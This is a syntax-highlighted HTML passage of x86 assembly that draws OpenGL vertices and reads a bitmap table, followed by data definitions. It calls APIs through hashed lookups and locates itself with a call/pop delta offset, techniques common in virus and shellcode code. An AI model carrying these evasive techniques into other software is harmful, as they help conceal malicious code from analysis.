</span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; X coord</span><span class="sc0">
</span><span class="sc7">fsub</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">084A94FFDh</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k612</span><span class="sc0">       </span><span class="sc1">; glVertex3d</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc7">fadd</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc7">fadd</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">084A94FFDh</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k630</span><span class="sc0">           </span><span class="sc1">; glVertex3d</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc7">fsub</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc7">fadd</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">084A94FFDh</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k648</span><span class="sc0">               </span><span class="sc1">; glVertex3d</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc7">fsub</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc7">fld</span><span class="sc0"> </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc7">fsub</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc7">fstp</span><span class="sc0">    </span><span class="sc10">qword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">FP_apicall</span><span class="sc0">  </span><span class="sc2">084A94FFDh</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc4">,</span><span class="sc5">k666</span><span class="sc0">               </span><span class="sc1">; glVertex3d</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">testpos</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;int     3</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gettest</span><span class="sc0">
</span><span class="sc5">gettest</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">calcpos</span><span class="sc4">-</span><span class="sc5">gettest</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">0111b</span><span class="sc0">

</span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">drawmme</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0.125</span><span class="sc0">
        </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0.25</span><span class="sc0">
</span><span class="sc5">drawspeed</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0.5</span><span class="sc0">

</span><span class="sc5">drawthat</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">drawme</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0.50</span><span class="sc0">
        </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">1.0</span><span class="sc0">

</span><span class="sc5">rotated</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">1.0</span><span class="sc0">
        </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">0.95</span><span class="sc0">

        </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc2">180.0</span><span class="sc0">

</span><span class="sc5">LightPosition</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">50.00001</span><span class="sc0">

        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0.5</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">calcpos</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">drawtext</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">017h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e2h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0cfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0efh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0f9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0efh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0a2h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0eah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fbh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0deh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0efh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0edh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f1h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e3h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f7h</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">07fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0feh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01fh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0fah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0efh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ffh</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fdh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0afh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0aah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f1h</span><span class="sc0">
